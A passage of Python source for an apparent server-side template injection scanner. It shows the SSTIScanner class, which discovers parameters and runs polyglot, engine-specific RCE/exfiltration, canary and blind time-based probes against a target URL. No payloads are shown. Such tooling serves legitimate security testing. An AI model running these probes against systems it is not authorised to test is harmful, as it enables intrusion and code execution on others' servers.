        _CONF_ORDER.get(f.confidence, 9),
        f.engine_detected,
    ))
    return unique


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

class SSTIScanner:
    """
    Server-Side Template Injection (SSTI) scanner.

    Four-phase detection pipeline:

      Phase 1 — Polyglot sweep: 25 payloads spanning 15 engines.
                Math expressions, string filters, error triggers.
      Phase 2 — Engine-specific deep probes: RCE / data exfiltration
                payloads targeting the engine identified in phase 1.
      Phase 3 — Canary math verification: randomised multiplication to
                eliminate false positives from static-string reflection.
      Phase 4 — Blind time-based detection: sleep payloads for endpoints
                that don't reflect output directly.

    Engines covered: Jinja2, Mako, Tornado, Django, Twig, Smarty,
    Freemarker, Velocity, Pebble, Thymeleaf, ERB, EJS, Nunjucks,
    Handlebars, Groovy.

    Usage in app.py:
        scanner = SSTIScanner(target_url=f"https://{domain}")
        results = scanner.scan()
        scan_results[scan_id]['ssti_scanner'] = results
    """

    def __init__(
        self,
        target_url: str,
        known_params: Optional[Dict[str, List[str]]] = None,
        timeout: float = 8.0,
        max_workers: int = 12,
        rate_delay: float = 0.2,
        proxy: Optional[str] = None,
        skip_blind: bool = False,
        skip_rce: bool = False,
    ):
        self.target_url   = target_url.rstrip("/")
        self.known_params = known_params or {}
        self.timeout      = timeout
        self.max_workers  = max_workers
        self.rate_delay   = rate_delay
        self.proxy        = proxy
        self.skip_blind   = skip_blind
        self.skip_rce     = skip_rce

    def scan(self) -> Dict:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

        session = _build_session(self.proxy)
        t0      = time.monotonic()

        print(f"[ssti] target  : {self.target_url}")

        # ── Parameter discovery ────────────────────────────────────────────
        print(f"[ssti] phase 0 : parameter discovery")
        discovered = _discover_params(
            session, self.target_url, self.timeout, self.max_workers
        )
        # Merge caller-supplied known params
        for url, params in self.known_params.items():
            discovered.setdefault(url, [])
            for p in params:
                if p not in discovered[url]:
                    discovered[url].append(p)

        total_params = sum(len(v) for v in discovered.values())
        print(f"[ssti] params  : {total_params} across {len(discovered)} endpoints")

        if not discovered:
            print("[ssti] no reflective parameters found — aborting")
            return {
                "target":          self.target_url,
                "params_tested":   0,
                "total_findings":  0,
                "rce_confirmed":   0,
                "engines_found":   [],
                "findings":        [],
                "elapsed_seconds": round(time.monotonic() - t0, 2),
            }

        state = ScanState(
            target_url=self.target_url,
            discovered_params=discovered,
        )

        # ── Phase 1: polyglot sweep ────────────────────────────────────────
        print(f"[ssti] phase 1 : polyglot detection sweep")
        detections = _phase1_sweep(
            session, state, self.timeout, self.rate_delay, self.max_workers
        )
        print(f"[ssti] phase 1 : {len(detections)} (url,param) detections")

        # ── Phase 2: engine-specific deep probes ───────────────────────────
        if detections and not self.skip_rce:
            print(f"[ssti] phase 2 : engine-specific deep probes")
            _phase2_deep(
                session, state, detections,
                self.timeout, self.rate_delay, self.max_workers
            )

        # ── Phase 3: canary math verification ─────────────────────────────
        if detections:
            print(f"[ssti] phase 3 : canary math verification")
            _phase3_canary_verify(
                session, state, detections,
                self.timeout, self.rate_delay,
            )

        # ── Phase 4: blind time-based ──────────────────────────────────────
        if not self.skip_blind:
            print(f"[ssti] phase 4 : blind time-based probes")
            _blind_ssti_probe(
                session, state, self.timeout, self.rate_delay, self.max_workers
            )

        # ── Post-process ───────────────────────────────────────────────────
        findings = _dedup_sort(state.findings)

        rce_findings   = [f for f in findings if f.rce_confirmed]
        engines_found  = list(dict.fromkeys(
            f.engine_detected for f in findings
            if f.engine_detected not in ("unknown", "polyglot")
        ))

        sev_counts: Dict[str, int] = {}
        for f in findings:
            sev_counts[f.severity] = sev_counts.get(f.severity, 0) + 1

        elapsed = time.monotonic() - t0
        print(
            f"[ssti] done | findings={len(findings)} "
            f"rce={len(rce_findings)} "
            f"engines={engines_found} "
            f"elapsed={elapsed:.1f}s"
        )

        return {
            "target":           self.target_url,
            "params_tested":    total_params,
            "endpoints_tested": len(discovered),
            "total_findings":   len(findings),
            "rce_confirmed":    len(rce_findings),
            "engines_found":    engines_found,
            "severity_summary": sev_counts,
            "elapsed_seconds":  round(elapsed, 2),
            "findings": [
                {
                    "url":             f.url,
                    "parameter":       f.parameter,
                    "method":          f.method,
                    "payload":         f.payload,
                    "engine_detected": f.engine_detected,
                    "phase":           f.phase,
                    "label":           f.label,
                    "rce_confirmed":   f.rce_confirmed,
                    "severity":        f.severity,
                    "confidence":      f.confidence,
                    "evidence":        f.evidence,
                    "response_snippet":f.response_snippet,
                    "cwe":             f.cwe,
                    "cvss":            f.cvss,
                }
                for f in findings
            ],
        }